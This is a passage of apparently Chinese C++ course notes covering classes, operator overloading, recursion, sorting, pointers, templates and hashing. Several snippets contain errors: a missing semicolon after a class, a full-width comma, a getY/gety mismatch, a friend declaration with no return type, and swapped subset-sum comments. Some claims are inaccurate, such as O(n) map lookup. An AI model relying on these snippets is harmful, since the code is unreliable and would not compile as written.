<p>如果类中没有显式定义析构函数，编译器会生成一个<strong>默认的析构函数</strong>，但这个默认析构函数只会销毁基本数据类型和自动管理的成员。如果类中包含动态分配的内存或其他需要手动管理的资源，默认析构函数不会释放这些资源，可能会导致<strong>内存泄漏</strong>或<strong>资源泄露</strong>。</p>
</blockquote>
<ol type="1">
<li><p>定义</p>
<p>析构函数的名字是类名的前面加一个波浪号
<code>~</code>，并且它没有参数和返回值。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~<span class="built_in">ClassName</span>() {</span><br><span class="line">    <span class="comment">// 清理工作，如释放动态内存</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>调用：</p>
<ul>
<li>当对象离开作用域时，自动调用析构函数。</li>
<li>如果对象是通过 <code>new</code> 分配的，当对其调用
<code>delete</code> 时，析构函数会被调用。</li>
<li>当一个类的对象在程序结束时被销毁，析构函数会自动调用。</li>
</ul>
<p>示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> {</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> *data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyClass</span>() {</span><br><span class="line">        data = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];  <span class="comment">// 动态分配内存</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">MyClass</span>() {</span><br><span class="line">        <span class="keyword">delete</span>[] data;  <span class="comment">// 释放内存，防止内存泄漏</span></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h4 id="接口与实现分离">接口与实现分离</h4>
<ul>
<li><p>将类的定义以及类的函数原型写在<code>.h</code>文件中，如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * File: point.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _point_h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _point_h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>();</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> xc, <span class="type">int</span> yc);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getY</span><span class="params">()</span></span>;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p><code>#ifndef _point_h</code>：如果符号 <code>_point_h</code>
没有定义，则继续编译。</p>
<p><code>#define _point_h</code>：定义符号
<code>_point_h</code>，防止后续重复包含。</p>
<p><code>#endif</code>：结束条件编译，确保头文件内容只被编译一次。</p>
<p>上述代码是为了防止“重复定义”错误</p>
</blockquote></li>
<li><p>将函数的具体实现写在<code>.cpp</code>文件中（注意函数名前要加类名作为限定符），如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * File: point.cpp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"point.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">Point::<span class="built_in">Point</span>() {</span><br><span class="line">    x = <span class="number">0</span>;</span><br><span class="line">    y = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">Point::<span class="built_in">Point</span>(<span class="type">int</span> xc，<span class="type">int</span> yc) {</span><br><span class="line">    x = xc;</span><br><span class="line">    y = yc;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Point::getX</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Point::gety</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h3 id="运算符重载">运算符重载</h3>
<ul>
<li><p>重载的运算符是带有特殊名称的函数，函数名是由关键字 operator
和其后要重载的运算符符号构成的，例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Point <span class="keyword">operator</span>+(Point p1, Point p2);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><code>&lt;&lt;</code>运算符也可以参与重载，难点在于该运算符的类型，它通常和
<code>std::ostream</code> 类型结合使用，示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ostream &amp; <span class="keyword">operator</span>&lt;&lt;(ostream &amp; os, Point point) {   <span class="comment">// 这里的 &amp; 是必须要添加的</span></span><br><span class="line">    <span class="comment">// os表示输出流对象，可以是 std::cout 或文件输出流</span></span><br><span class="line">    os &lt;&lt; <span class="string">"("</span> &lt;&lt; point.x &lt;&lt; <span class="string">", "</span> &lt;&lt; point.y &lt;&lt; <span class="string">")"</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>如果不返回 <code>std::ostream &amp;</code>，而是返回
<code>std::ostream</code>（即按值返回），则每次 <code>&lt;&lt;</code>
操作都会创建一个新的 <code>std::ostream</code>
对象，丢失原始流的上下文信息</p>
</blockquote></li>
<li><p><code>==</code>运算符重载，下面以Point类为例，假设该函数属于类的成员，因此可以访问私有变量x和y</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> Point::<span class="keyword">operator</span>==(Point rhs) {   <span class="comment">// 若在类内实现该函数则省略“Point”前缀</span></span><br><span class="line">   <span class="keyword">return</span> x == rhs.x &amp;&amp; y == rhs.y; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p><code>++</code>运算符重载需要注意是前缀还是后缀，后缀情况下（<code>i++</code>），参数里需要添加<code>int</code>，例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Direction <span class="keyword">operator</span>++(Direction &amp; dir, <span class="type">int</span>) {  </span><br><span class="line">   Direction old = dir; </span><br><span class="line">   dir = <span class="built_in">Direction</span>(dir + <span class="number">1</span>); </span><br><span class="line">   <span class="keyword">return</span> old;  <span class="comment">// ++ 作为后缀，则操作数先返回原值在自增</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h3 id="友元函数">友元函数</h3>
<p>类的友元函数在类中声明，但不属于类的成员，但有权访问类的所有私有（private）成员和保护（protected）成员。</p>
<ul>
<li><p>友元函数在类中声明时需要添加<code>friend</code>前缀</p></li>
<li><p>示例，若<code>==</code>运算符不是Point类的成员但是想要访问私有成员，则需要在类中声明</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">friend</span> <span class="keyword">operator</span>==(Point rhs);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>友元类：可以访问另一个类的成员</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span></span><br><span class="line">{</span><br><span class="line">	......</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Point</span>; <span class="comment">// Point可以访问Building类中的成员</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Building</span>();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    string str;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h2 id="chapter-7">Chapter 7</h2>
<p>递归</p>
<h2 id="chapter-8">Chapter 8</h2>
<h3 id="汉诺塔问题">汉诺塔问题</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">moveTower</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> start, <span class="type">char</span> finish, <span class="type">char</span> tmp)</span> </span>{ </span><br><span class="line">   <span class="keyword">if</span> (n == <span class="number">1</span>) { </span><br><span class="line">      Move a single disk from start to finish. </span><br><span class="line">   } <span class="keyword">else</span> { </span><br><span class="line">      Move a tower of size n - <span class="number">1</span> from start to tmp. </span><br><span class="line">      Move a single disk from start to finish. </span><br><span class="line">      Move a tower of size n - <span class="number">1</span> from tmp to finish. </span><br><span class="line">   } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="子集求和">子集求和</h3>
<p>每个元素有两种可能：在子集内，不在子集内</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">subsetSumExists</span><span class="params">(Set&lt;<span class="type">int</span>&gt; &amp; set, <span class="type">int</span> target)</span> </span>{ </span><br><span class="line">   <span class="keyword">if</span> (set.<span class="built_in">isEmpty</span>()) { </span><br><span class="line">      <span class="keyword">return</span> target == <span class="number">0</span>; </span><br><span class="line">   } <span class="keyword">else</span> { </span><br><span class="line">      <span class="type">int</span> element = set.<span class="built_in">first</span>(); </span><br><span class="line">      Set&lt;<span class="type">int</span>&gt; rest = set - element; </span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">subsetSumExists</span>(rest, target)   <span class="comment">// 在子集内</span></span><br><span class="line">          || <span class="built_in">subsetSumExists</span>(rest, target - element);  <span class="comment">// 不在子集内</span></span><br><span class="line">   } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="排列">排列</h3>
<p>例如<code>ABC</code>的排列是<code>{ "ABC", "ACB", "BAC", "BCA", "CAB", "CBA" }</code></p>
<p>若是对n个字符进行排列，可先选取一个字符，然后对剩余的 n-1
个字符进行排列</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">set&lt;string&gt; <span class="title">generatePermutations</span><span class="params">(string str)</span> </span>{</span><br><span class="line">    set&lt;string&gt; ans;</span><br><span class="line">    <span class="keyword">if</span>(str == <span class="string">""</span>)</span><br><span class="line">        ans.<span class="built_in">insert</span>(str);</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;str.<span class="built_in">length</span>(); i++) {</span><br><span class="line">            <span class="type">char</span> c = str[i];</span><br><span class="line">            string rest = str.<span class="built_in">substr</span>(<span class="number">0</span>, i) + str.<span class="built_in">substr</span>(i+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(string s : <span class="built_in">generatePermutations</span>(rest)) {   <span class="comment">// 递归</span></span><br><span class="line">                ans.<span class="built_in">insert</span>(c+s);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="chapter-9">Chapter 9</h2>
<p>回溯算法</p>
<h2 id="chapter-10">Chapter 10</h2>
<p>算法分析</p>
<h3 id="big-o">big-O</h3>
<p>描述算法的时间复杂度</p>
<h3 id="选择算法">选择算法</h3>
<ul>
<li>选取 [i, n-1] 区间内最小/最大的元素与i处的元素交换次序</li>
<li>排序趟数与序列的原始状态无关</li>
<li>比较次数也与序列初始状态无关</li>
<li>时间复杂度：O(n<sup>2</sup>)</li>
</ul>
<h3 id="归并排序">归并排序</h3>
<ul>
<li><p>先从中间划分两个子序列，对左侧子序列递归排序，对右侧子序列递归排序，归并</p></li>
<li><p>时间复杂度：O(nlogn)</p></li>
</ul>
<h3 id="不同时间复杂度">不同时间复杂度</h3>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240926125413614.png" alt="image-20240926125413614">
<figcaption aria-hidden="true">image-20240926125413614</figcaption>
</figure>
<h3 id="快速排序">快速排序</h3>
<p>归并排序在实践中用的不多。快速排序也用到了分治的思想。</p>
<ul>
<li>最简单的策略是选择向量中的第一个元素作为枢轴</li>
<li>两端有low和high指针，一趟排序结束后分为两个子序列。枢轴处于其最终位置</li>
<li>若是从小到大排序，则枢轴左边的子序列所有值小于枢轴右边的子序列所有值</li>
<li>详细步骤：
<ul>
<li>先移动high指针找到比枢轴小的元素。若找不到则会与low重合</li>
<li>若找到满足条件的元素，high指针停止移动，开始移动low指针找到比枢轴大的元素，若找不到则会与high重合</li>
<li>若找到满足条件的元素，且两个指针未重合，交换两个指针指向的元素</li>
<li>若两个指针重合且low指向的元素小于枢轴元素，则交换两个元素</li>
</ul></li>
<li>平均时间复杂度：O(nlogn)</li>
<li>最坏情况——有序：O(n<sup>2</sup>)</li>
</ul>
<h2 id="chapter-11">Chapter 11</h2>
<p>指针与数组</p>
<h3 id="二进制和十六进制">二进制和十六进制</h3>
<ul>
<li>无符号数</li>
<li>有符号数（补码）</li>
<li>内存地址一般用十六进制表示</li>
</ul>
<h3 id="内存">内存</h3>
<ul>
<li>进程地址空间</li>
<li>栈帧：<strong>函数调用</strong>期间保存在栈中的数据结构，用于存储参数、局部变量和返回地址等</li>
</ul>
<h3 id="指针">指针</h3>
<p>存放内存地址的数据项被称为指针</p>
<h4 id="指针声明">指针声明</h4>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p; <span class="comment">// 指向int的指针</span></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><p><code>* + 指针名</code>：获取指针指向的值</p></li>
<li><p><code>&amp; + 变量名</code>：获取该变量所在的内存地址</p></li>
<li><p>示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="type">int</span> *p1, *p2;</span><br><span class="line">x = <span class="number">42</span>;</span><br><span class="line">y = <span class="number">163</span>;</span><br><span class="line">p1 = &amp;y;  <span class="comment">// 使p1指向y</span></span><br><span class="line">p2 = &amp;x;  <span class="comment">// 使p2指向x</span></span><br></pre></td></tr></tbody></table></figure>
<p>经过以上操作后，内存如图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20241010145846709.png"></p></li>
<li><p>若要修改<code>y</code>的值，可以使用下面的语句：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*p1 = <span class="number">17</span>;</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>当指针指向一个对象时，可通过<code>-&gt;</code>以及<code>.</code>来访问该对象的成员，例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Point <span class="title">pt</span><span class="params">(<span class="number">3</span>, <span class="number">4</span>)</span></span>; </span><br><span class="line">Point *pp = &amp;pt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面两行是等价的</span></span><br><span class="line">(*pp).<span class="built_in">getX</span>();</span><br><span class="line">pp-&gt;<span class="built_in">getX</span>();</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h3 id="关键字-this">关键字 <code>this</code></h3>
<ul>
<li><p><code>this</code>是指向当前变量的指针</p></li>
<li><p>使用<code>this</code>可以避免类中构造函数中的变量冲突，同时方便用户理解：</p></li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Point</span>(<span class="type">int</span> x, <span class="type">int</span> y) { </span><br><span class="line">   <span class="keyword">this</span>-&gt;x = x; </span><br><span class="line">   <span class="keyword">this</span>-&gt;y = y; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="空指针">空指针</h3>
<ul>
<li>使用常量<code>NULL</code>表示空指针</li>
<li>对空指针使用<code>*</code>运算符是违法的</li>
</ul>
<h3 id="引用">引用</h3>
<ul>
<li><p>将参数通过引用进行传递时，栈帧会存储指针，指针指向该值所在的调用函数中的位置。对该值的任何更改在函数返回后仍然有效</p></li>
<li><p>不使用引用，而是直接通过指针进行swap操作：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> *px, <span class="type">int</span> *py)</span> </span>{ </span><br><span class="line">    <span class="type">int</span> tmp = *px; </span><br><span class="line">    *px = *py; </span><br><span class="line">    *py = tmp; </span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">swap</span>(&amp;n1, &amp;n2); </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>指针引用：例如<code>int* &amp; p;</code>表示对指针p的引用</p></li>
</ul>
<h3 id="数组">数组</h3>
<ul>
<li><p>数组定义：<code>type name[size];</code></p></li>
<li><p>数组元素访问通过数组下标（索引）</p></li>
<li><p>通过<code>sizeof</code>获取数组长度以及元素大小</p></li>
<li><p>数组名称与指向初始元素的指针相同</p></li>
<li><p>数组作为参数被调用时，与引用的效果相同，例如下面的代码能够对传入的数组进行排序</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sort</span><span class="params">(<span class="type">int</span> array[], <span class="type">int</span> n)</span> </span>{   <span class="comment">// 或者写成 void sort(int *array, int n) </span></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> lh = <span class="number">0</span>; lh &lt; n; lh++) { </span><br><span class="line">      <span class="type">int</span> rh = lh; </span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = lh + <span class="number">1</span>; i &lt; n; i++) { </span><br><span class="line">         <span class="keyword">if</span> (array[i] &lt; array[rh]) rh = i; </span><br><span class="line">      } </span><br><span class="line">      <span class="built_in">swap</span>(array[lh], array[rh]); </span><br><span class="line">   } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>字符数组使用<code>strcpy</code>函数时，没有尝试检查目标是否有足够的空间来保存源字符串的副本。如果没有足够的内存来保存完整的字符串，其他特殊用途的内存可能会被覆盖。这种形式的问题称为缓冲区溢出错误</p></li>
</ul>
<h2 id="chapter-12">Chapter 12</h2>
<p>动态内存管理</p>
<ul>
<li>动态内存管理是对<strong>堆</strong>进行操作</li>
<li>vector、map等集合类都是存放在堆上的</li>
</ul>
<h3 id="new操作符"><code>new</code>操作符</h3>
<ul>
<li><p><code>new</code>操作符从<strong>堆</strong>中分配内存，会返回堆中为保存对象而留出的存储位置的<strong>地址</strong>，例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *ip = <span class="keyword">new</span> <span class="type">int</span>;   <span class="comment">// 等号右边返回的是内存指针</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>动态数组：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> *array = <span class="keyword">new</span> <span class="type">double</span>[<span class="number">3</span>];</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>动态对象：在堆上为 Rational 对象分配空间并调用缺省构造函数</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rational *rp = <span class="keyword">new</span> Rational;</span><br></pre></td></tr></tbody></table></figure>
<p>若在类型名称后面提供参数，则会调用对应的构造函数</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rational *rp = <span class="keyword">new</span> <span class="built_in">Rational</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h2 id="chapter-13">Chapter 13</h2>
<h3 id="文本编辑软件模式">文本编辑软件模式</h3>
<ul>
<li><strong>MVC</strong>模式：model-view-controller。以手机文本编辑软件为例，键盘代表控制器，显示器代表视图，底层数据结构代表模型</li>
<li>大多数编辑器都是使用模型-视图-控制器模式设计的。在模型内部，编辑器维护一个字符序列，通常称为缓冲区。控制器允许您对缓冲区的内容执行各种操作</li>
</ul>
<h3 id="数组栈链表">数组、栈、链表</h3>
<p>三种方法实现文本编辑功能在效率上的区别</p>
<ul>
<li>数组：插入和删除操作需要O(n)</li>
<li>栈：分为光标左右两个栈，光标移动到开头和结尾需要O(n)</li>
<li>单链表：光标向左移动和移动到结尾需要O(n)</li>
<li>双链表：解决上述单链表的缺点，上述两个操作只需要 O(1)
时间复杂度</li>
</ul>
<h2 id="chapter-14">Chapter 14</h2>
<p>模板</p>
<h3 id="模板函数">模板函数</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> ValueType&gt;  <span class="comment">// ValueType是占位符，表示数据类型</span></span><br><span class="line"><span class="function">ValueType <span class="title">max</span><span class="params">(ValueType x, ValueType y)</span> </span>{ </span><br><span class="line">   <span class="keyword">return</span> (x &gt; y) ? x : y; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>每当编译器遇到一个模板函数应用于它尚未处理过的类型时，它都会生成一个适用于该类型的函数体的全新副本。因此，如果在同一程序中对int、double、char、string使用max函数，编译器将生成四个代码副本，每种类型一个。</p>
<p>“模板”提供的是一种模式，使得编译器可以在需要时从中生成专门定制的版本。</p>
<blockquote>
<p><code>template &lt;class T&gt;</code>：这是早期 C++
规范中的写法，<code>class</code> 关键字用于定义模板参数的类型。</p>
<p><code>template &lt;typename T&gt;</code>：这是 C++
标准化后引入的一种更加语义化的写法，<code>typename</code>
关键字强调模板参数表示的是一种类型</p>
</blockquote>
<h3 id="模板类">模板类</h3>
<ul>
<li><p>在类定义前一行添加<code>template &lt;typename ValueType&gt;</code>，那么类中的所有成员函数都会自动使用这个模板参数
<code>T</code>，因为这个模板参数是与类绑定的。你不需要再为每个成员函数重新声明<code>template &lt;typename ValueType&gt;</code>。</p></li>
<li><p>在模板类中如果你只是声明了函数，并打算在类的<strong>外部</strong>实现它，那么在实现时需要在函数定义之前<strong>添加</strong>
<code>template&lt;typename T&gt;</code>。示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">void</span> MyClass&lt;T&gt;::<span class="built_in">show</span>() { <span class="comment">// 注意指明该函数是属于MyClass的成员函数</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Data: "</span> &lt;&lt; data &lt;&lt; std::endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h2 id="chapter-15">Chapter 15</h2>
<h3 id="maps">Maps</h3>
<ul>
<li>映射：通过查找map查找元素，时间复杂度为O(n)</li>
</ul>
<h3 id="哈希">哈希</h3>
<p>通过key找到value的位置</p>
<ul>
<li><p>选择一个函数将key转换为整数值（哈希码）</p></li>
<li><p>该策略（利用哈希函数进行映射）可抽象出哈希表</p></li>
<li><p>链表数组（数组每个元素是链表）：数组的每一个元素（链表）被称为
<strong>bucket</strong></p></li>
<li><p>哈希码的取值范围通常远大于桶的数量，可以通过模运算（取余数）将哈希码缩小到桶的范围内</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bucket是桶编号，nBucket是桶的数量</span></span><br><span class="line"><span class="type">int</span> bucket = <span class="built_in">hashCode</span>(key) % nBuckets;</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>将两个或更多不同的键哈希与同一存储桶的键称为<strong>碰撞</strong></p></li>
<li><p>负载因子α：计算公式为：<span class="math inline">\(\alpha =
\frac{n}{m}\)</span></p>
<ul>
<li>n：当前哈希表中存储的元素数量。</li>
<li>m：哈希表中桶（槽）的数量。</li>
<li><strong>较低的负载因子</strong>：表示哈希表中有许多空桶，这通常意味着插入和查找操作的平均时间复杂度较低，因为发生碰撞的概率较小。</li>
<li><strong>较高的负载因子</strong>：表示哈希表中接近满的状态，可能会导致较多的碰撞，从而增加查找和插入操作的时间复杂度</li>
</ul></li>
<li><p><strong>HashMap</strong>：map的查找速度一般是O(n)，而hashMap查找速度是O(1)</p></li>
</ul>
<h2 id="chapter-16">Chapter 16</h2>
<p>树</p>
<h3 id="二叉搜索树bst">二叉搜索树（BST）</h3>
<ul>
<li>二叉搜索树的每个节点的权值都是唯一的</li>
<li>左子树 &lt; 根节点 &lt; 右子树</li>
</ul>
